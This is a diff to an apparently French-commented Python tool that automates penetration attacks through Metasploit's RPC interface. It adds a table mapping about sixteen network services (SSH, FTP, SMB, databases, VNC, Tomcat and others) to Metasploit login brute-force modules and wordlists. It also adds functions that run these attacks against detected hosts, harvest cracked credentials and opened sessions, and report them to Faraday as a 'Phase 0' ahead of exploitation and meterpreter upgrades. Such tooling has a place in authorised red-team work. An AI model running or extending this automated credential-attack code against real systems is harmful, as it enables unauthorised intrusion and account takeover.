@@ -20,18 +20,34 @@ try:
 except ImportError:
     _anthropic_sdk = None
 
+def _read_secret(name, legacy_env=None):
+    """Read sensitive value: legacy env var → NAME env var → /run/secrets/name file."""
+    if legacy_env:
+        v = os.getenv(legacy_env, "")
+        if v:
+            return v
+    v = os.getenv(name.upper(), "")
+    if v:
+        return v
+    try:
+        with open(f"/run/secrets/{name}") as f:
+            return f.read().strip()
+    except OSError:
+        return ""
+
+
 # Récupération sécurisée des credentials PostgreSQL
 PG_HOST = os.getenv("PG_HOST", "postgres")
 PG_PORT = int(os.getenv("PG_PORT", "5432"))
 PG_USER = os.getenv("PG_USER", "postgres")
-PG_PASSWORD = os.getenv("PG_PASSWORD", "")
+PG_PASSWORD = _read_secret("postgres_password", "PG_PASSWORD")
 PG_DBNAME = os.getenv("PG_DBNAME", "msf")
 
 MODE_RUN = int(os.getenv("MODE_RUN", "1"))
 
 FARADAY_URL      = os.getenv('FARADAY_URL', '').rstrip('/')
 FARADAY_USER     = os.getenv('FARADAY_USER', 'faraday')
-FARADAY_PASSWORD = os.getenv('FARADAY_PASSWORD', '')
+FARADAY_PASSWORD = _read_secret("faraday_password", "FARADAY_PASSWORD")
 FARADAY_WS       = os.getenv('FARADAY_WORKSPACE', 'default')
 
 def _detect_local_ip() -> str:
@@ -72,6 +88,165 @@ LHOST = _pick_redirector()
 LPORT = int(os.getenv("LPORT", "4444"))          # port externe (payload) — ex: 24444
 LPORT_BIND = int(os.getenv("LPORT_BIND", str(LPORT)))  # port handler interne — ex: 4444
 BIND_PORT = int(os.getenv("BIND_PORT", "5556"))
+
+SSH_USER_FILE     = os.getenv("SSH_USER_FILE", "/usr/share/metasploit-framework/data/wordlists/unix_users.txt")
+SSH_PASS_FILE     = os.getenv("SSH_PASS_FILE", "/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt")
+SSH_BRUTE_TIMEOUT = int(os.getenv("SSH_BRUTE_TIMEOUT", "300"))
+SSH_THREADS       = int(os.getenv("SSH_THREADS", "4"))
+
+# ─── Config brute-force par service ──────────────────────────────────────────
+_WL = "/usr/share/metasploit-framework/data/wordlists"
+
+def _wl(env_key, default):
+    """Résout un chemin de wordlist depuis l'env ou la valeur par défaut."""
+    return os.getenv(env_key, default)
+
+BRUTE_MODULES = {
+    'ssh': {
+        'module': 'scanner/ssh/ssh_login',
+        'ports': {22}, 'services': {'ssh'},
+        'user_file': SSH_USER_FILE,
+        'pass_file': SSH_PASS_FILE,
+        'timeout': SSH_BRUTE_TIMEOUT, 'threads': SSH_THREADS,
+        'extra': {'STOP_ON_SUCCESS': True, 'VERBOSE': False},
+    },
+    'ftp': {
+        'module': 'scanner/ftp/ftp_login',
+        'ports': {21, 2121}, 'services': {'ftp'},
+        'user_file': _wl('FTP_USER_FILE',        f'{_WL}/unix_users.txt'),
+        'pass_file': _wl('FTP_PASS_FILE',        f'{_WL}/unix_passwords.txt'),
+        'timeout': int(os.getenv('FTP_BRUTE_TIMEOUT', '180')),
+        'threads': int(os.getenv('FTP_THREADS', '4')),
+        'extra': {'ANONYMOUS_LOGIN': True, 'STOP_ON_SUCCESS': True, 'VERBOSE': False},
+    },
+    'telnet': {
+        'module': 'scanner/telnet/telnet_login',
+        'ports': {23}, 'services': {'telnet'},
+        'user_file': _wl('TELNET_USER_FILE',     f'{_WL}/unix_users.txt'),
+        'pass_file': _wl('TELNET_PASS_FILE',     f'{_WL}/unix_passwords.txt'),
+        'timeout': int(os.getenv('TELNET_BRUTE_TIMEOUT', '180')),
+        'threads': int(os.getenv('TELNET_THREADS', '4')),
+        'extra': {'STOP_ON_SUCCESS': True, 'VERBOSE': False},
+    },
+    'smb': {
+        'module': 'scanner/smb/smb_login',
+        'ports': {139, 445}, 'services': {'netbios-ssn', 'microsoft-ds', 'smb'},
+        'user_file': _wl('SMB_USER_FILE',        f'{_WL}/unix_users.txt'),
+        'pass_file': _wl('SMB_PASS_FILE',        f'{_WL}/unix_passwords.txt'),
+        'timeout': int(os.getenv('SMB_BRUTE_TIMEOUT', '300')),
+        'threads': int(os.getenv('SMB_THREADS', '4')),
+        'extra': {'STOP_ON_SUCCESS': True, 'VERBOSE': False},
+    },
+    'mysql': {
+        'module': 'scanner/mysql/mysql_login',
+        'ports': {3306}, 'services': {'mysql'},
+        'user_file': _wl('MYSQL_USER_FILE',      f'{_WL}/mysql_default_user.txt'),
+        'pass_file': _wl('MYSQL_PASS_FILE',      f'{_WL}/mysql_default_pass.txt'),
+        'timeout': int(os.getenv('MYSQL_BRUTE_TIMEOUT', '180')),
+        'threads': int(os.getenv('MYSQL_THREADS', '4')),
+        'extra': {'BLANK_PASSWORDS': True, 'STOP_ON_SUCCESS': True, 'VERBOSE': False},
+    },
+    'postgresql': {
+        'module': 'scanner/postgres/postgres_login',
+        'ports': {5432}, 'services': {'postgresql', 'postgres'},
+        'user_file': _wl('PGSQL_USER_FILE',      f'{_WL}/postgres_default_user.txt'),
+        'pass_file': _wl('PGSQL_PASS_FILE',      f'{_WL}/postgres_default_pass.txt'),
+        'timeout': int(os.getenv('PGSQL_BRUTE_TIMEOUT', '180')),
+        'threads': int(os.getenv('PGSQL_THREADS', '4')),
+        'extra': {'STOP_ON_SUCCESS': True, 'VERBOSE': False},
+    },
+    'mssql': {
+        'module': 'scanner/mssql/mssql_login',
+        'ports': {1433}, 'services': {'ms-sql', 'ms-sql-s', 'mssql'},
+        'user_file': _wl('MSSQL_USER_FILE',      f'{_WL}/unix_users.txt'),
+        'pass_file': _wl('MSSQL_PASS_FILE',      f'{_WL}/unix_passwords.txt'),
+        'timeout': int(os.getenv('MSSQL_BRUTE_TIMEOUT', '180')),
+        'threads': int(os.getenv('MSSQL_THREADS', '4')),
+        'extra': {'STOP_ON_SUCCESS': True, 'VERBOSE': False},
+    },
+    'vnc': {
+        'module': 'scanner/vnc/vnc_login',
+        'ports': {5900, 5901, 5902}, 'services': {'vnc'},
+        'user_file': None,   # VNC : pas de username
+        'pass_file': _wl('VNC_PASS_FILE',        f'{_WL}/vnc_passwords.txt'),
+        'timeout': int(os.getenv('VNC_BRUTE_TIMEOUT', '120')),
+        'threads': int(os.getenv('VNC_THREADS', '4')),
+        'extra': {'STOP_ON_SUCCESS': True, 'VERBOSE': False},
+    },
+    'snmp': {
+        'module': 'scanner/snmp/snmp_login',
+        'ports': {161}, 'services': {'snmp'},
+        'user_file': None,   # SNMP : community strings via PASS_FILE uniquement
+        'pass_file': _wl('SNMP_COMMUNITY_FILE',  f'{_WL}/snmp_default_pass.txt'),
+        'timeout': int(os.getenv('SNMP_BRUTE_TIMEOUT', '60')),
+        'threads': int(os.getenv('SNMP_THREADS', '10')),
+        'extra': {'VERBOSE': False},
+    },
+    'imap': {
+        'module': 'scanner/imap/imap_login',
+        'ports': {143, 993}, 'services': {'imap', 'imap4', 'imap3'},
+        'user_file': _wl('IMAP_USER_FILE',       f'{_WL}/unix_users.txt'),
+        'pass_file': _wl('IMAP_PASS_FILE',       f'{_WL}/unix_passwords.txt'),
+        'timeout': int(os.getenv('IMAP_BRUTE_TIMEOUT', '120')),
+        'threads': int(os.getenv('IMAP_THREADS', '4')),
+        'extra': {'STOP_ON_SUCCESS': True, 'VERBOSE': False},
+    },
+    'pop3': {
+        'module': 'scanner/pop3/pop3_login',
+        'ports': {110, 995}, 'services': {'pop3'},
+        'user_file': _wl('POP3_USER_FILE',       f'{_WL}/unix_users.txt'),
+        'pass_file': _wl('POP3_PASS_FILE',       f'{_WL}/unix_passwords.txt'),
+        'timeout': int(os.getenv('POP3_BRUTE_TIMEOUT', '120')),
+        'threads': int(os.getenv('POP3_THREADS', '4')),
+        'extra': {'STOP_ON_SUCCESS': True, 'VERBOSE': False},
+    },
+    'smtp': {
+        'module': 'scanner/smtp/smtp_enum',
+        'ports': {25, 465, 587}, 'services': {'smtp', 'submission', 'smtps'},
+        'user_file': _wl('SMTP_USER_FILE',       f'{_WL}/unix_users.txt'),
+        'pass_file': None,   # smtp_enum = énumération VRFY/EXPN uniquement, pas de password
+        'timeout': int(os.getenv('SMTP_ENUM_TIMEOUT', '120')),
+        'threads': int(os.getenv('SMTP_THREADS', '10')),
+        'extra': {'VERBOSE': False},
+    },
+    'http': {
+        'module': 'scanner/http/http_login',
+        'ports': {80, 8080, 8000, 8888}, 'services': {'http', 'http-proxy', 'http-alt'},
+        'user_file': _wl('HTTP_USER_FILE',       f'{_WL}/http_default_users.txt'),
+        'pass_file': _wl('HTTP_PASS_FILE',       f'{_WL}/http_default_pass.txt'),
+        'timeout': int(os.getenv('HTTP_BRUTE_TIMEOUT', '120')),
+        'threads': int(os.getenv('HTTP_THREADS', '4')),
+        'extra': {'AUTH_URI': '/', 'STOP_ON_SUCCESS': True, 'VERBOSE': False},
+    },
+    'https': {
+        'module': 'scanner/http/http_login',
+        'ports': {443, 8443}, 'services': {'https', 'ssl/http', 'ssl/https'},
+        'user_file': _wl('HTTP_USER_FILE',       f'{_WL}/http_default_users.txt'),
+        'pass_file': _wl('HTTP_PASS_FILE',       f'{_WL}/http_default_pass.txt'),
+        'timeout': int(os.getenv('HTTP_BRUTE_TIMEOUT', '120')),
+        'threads': int(os.getenv('HTTP_THREADS', '4')),
+        'extra': {'AUTH_URI': '/', 'SSL': True, 'STOP_ON_SUCCESS': True, 'VERBOSE': False},
+    },
+    'tomcat': {
+        'module': 'scanner/http/tomcat_mgr_login',
+        'ports': {8080, 8180, 8443}, 'services': {'http', 'https'},
+        'attack_surface_key': 'tomcat_manager',  # uniquement si bm12 l'a détecté
+        'user_file': _wl('TOMCAT_USER_FILE',     f'{_WL}/tomcat_mgr_default_users.txt'),
+        'pass_file': _wl('TOMCAT_PASS_FILE',     f'{_WL}/tomcat_mgr_default_pass.txt'),
+        'timeout': int(os.getenv('TOMCAT_BRUTE_TIMEOUT', '120')),
+        'threads': int(os.getenv('TOMCAT_THREADS', '4')),
+        'extra': {'STOP_ON_SUCCESS': True, 'VERBOSE': False},
+    },
+    'mongodb': {
+        'module': 'scanner/mongodb/mongodb_login',
+        'ports': {27017}, 'services': {'mongodb'},
+        'user_file': _wl('MONGO_USER_FILE',      f'{_WL}/unix_users.txt'),
+        'pass_file': _wl('MONGO_PASS_FILE',      f'{_WL}/unix_passwords.txt'),
+        'timeout': int(os.getenv('MONGO_BRUTE_TIMEOUT', '120')),
+        'threads': int(os.getenv('MONGO_THREADS', '4')),
+        'extra': {'STOP_ON_SUCCESS': True, 'VERBOSE': False},
+    },
+}
 
 
 def read_secret(name: str) -> str | None:
@@ -791,6 +966,124 @@ def check_target(console, fullname, rhosts, rport):
         return True  # en cas d'erreur, procéder quand même
 
 
+def run_brute_force_service(client, host, port, cfg_name, cfg, upgraded_sessions, stats):
+    """
+    Lance un module auxiliary MSF de brute-force sur un service/port détecté.
+    Gère USER_FILE, PASS_FILE, THREADS, options extras et reporting Faraday.
+    Retourne True si au moins une session a été ouverte.
+    """
+    user_file = cfg.get('user_file')
+    pass_file = cfg.get('pass_file')
+    module    = cfg['module']
+    timeout   = cfg.get('timeout', 300)
+    threads   = cfg.get('threads', 4)
+    extra     = cfg.get('extra', {})
+
+    if user_file and not os.path.exists(user_file):
+        print(f"[BRUTE:{cfg_name}] USER_FILE introuvable: {user_file} — skip")
+        return False
+    if pass_file and not os.path.exists(pass_file):
+        print(f"[BRUTE:{cfg_name}] PASS_FILE introuvable: {pass_file} — skip")
+        return False
+    if not user_file and not pass_file:
+        print(f"[BRUTE:{cfg_name}] Aucune wordlist configurée — skip")
+        return False
+
+    print(f"[BRUTE:{cfg_name.upper()}] {host}:{port} | module={module}"
+          + (f" | USER={user_file}" if user_file else "")
+          + (f" | PASS={pass_file}" if pass_file else ""))
+
+    console_brute = client.consoles.console()
+    try:
+        try:
+            addr = ipaddress.ip_address(str(host).split("/")[0])
+            rhosts_val = f"[{host}]" if addr.version == 6 else str(host)
+        except ValueError:
+            rhosts_val = str(host)
+
+        aux = client.modules.use('auxiliary', module)
+        aux['RHOSTS']  = rhosts_val
+        aux['RPORT']   = port
+        aux['THREADS'] = threads
+        if user_file:
+            aux['USER_FILE'] = user_file
+        if pass_file:
+            aux['PASS_FILE'] = pass_file
+        for opt, val in extra.items():
+            try:
+                aux[opt] = val
+            except Exception:
+                pass
+
+        sessions_before = set(client.sessions.list.keys())
+        output = console_brute.run_module_with_output(aux, timeout=timeout)
+        short = (output or '').strip().replace('\n', ' ')[:200]
+        print(f"[BRUTE:{cfg_name.upper()}] {short}")
+
+        # Détecter credentials trouvés dans l'output MSF (lignes [+])
+        cred_lines = [l for l in (output or '').splitlines() if '[+]' in l]
+        if cred_lines:
+            print(f"[BRUTE:{cfg_name.upper()}] {len(cred_lines)} credential(s) trouvé(s):")
+            for line in cred_lines[:5]:
+                print(f"  {line.strip()}")
+            faraday_report_pwn(str(host), f'auxiliary/{module}',
+                               f'credential bruteforce port {port}')
+
+        # Vérifier nouvelles sessions (SSH, FTP, Telnet, SMB, VNC peuvent en ouvrir)
+        sessions_now = client.sessions.list
+        new_sessions = set(sessions_now.keys()) - sessions_before
+        if new_sessions:
+            handle_new_sessions(client, sessions_now, upgraded_sessions, host)
+            stats['pwned'].append((f'auxiliary/{module}', f'port:{port}'))
+            print(f"[BRUTE:{cfg_name.upper()}] Sessions ouvertes: {sorted(new_sessions)}")
+            report_vuln(str(host), f'auxiliary/{module}',
+                        f'bruteforce port {port}', sorted(new_sessions)[0])
+            return True
+
+    except Exception as e:
+        print(f"[BRUTE:{cfg_name.upper()}] Erreur port {port}: {e}")
+    finally:
+        try:
+            console_brute.destroy()
+        except Exception:
+            pass
+
+    return False
+
+
+def run_bruteforce_phase(client, host, services, attack_surface_vulns, upgraded_sessions, stats):
+    """
+    Phase 0 : brute-force credentials sur tous les services détectés.
+    Lance le module MSF approprié pour chaque service/port dans BRUTE_MODULES.
+    Un module donné n'est lancé qu'une seule fois même si plusieurs ports matchent.
+    """
+    attempted_modules = set()
+
+    for port, svc_name, *_ in services:
+        svc = (svc_name or '').lower()
+
+        for cfg_name, cfg in BRUTE_MODULES.items():
+            port_match = port in cfg['ports']
+            svc_match  = svc in cfg['services'] or any(
+                s in svc for s in cfg['services'] if len(s) >= 4
+            )
+            if not port_match and not svc_match:
+                continue
+
+            # Condition attack_surface (ex: tomcat_manager requis pour tomcat)
+            required_vuln = cfg.get('attack_surface_key')
+            if required_vuln and required_vuln not in attack_surface_vulns:
+                continue
+
+            # Ne pas relancer le même module sur un autre port
+            if cfg['module'] in attempted_modules:
+                continue
+            attempted_modules.add(cfg['module'])
+
+            run_brute_force_service(client, host, port, cfg_name, cfg,
+                                    upgraded_sessions, stats)
+
+
 def upgrade_to_meterpreter(client, sid, host, bind_port=None):
     """
     Upgrade une shell session en meterpreter via bind_tcp.
@@ -1188,6 +1481,12 @@ def main():
                              stats['faraday_ok'] = True
                          break  # session ouverte — inutile d'essayer d'autres payloads
          check_con.destroy()
+
+     # Phase 0 : brute-force credentials sur tous les services détectés
+     attack_surface_vulns = {v['vuln'] for v in scan_details.get('attack_surface', [])}
+     if services:
+         print(f"\n[PHASE 0] Brute-force credentials sur {host}")
+         run_bruteforce_phase(client, host, services, attack_surface_vulns, upgraded_sessions, stats)
 
      # Phase 1 : exploits remote (accès initial)
      print(f"\n[PHASE 1] Exploits remote sur {host}")
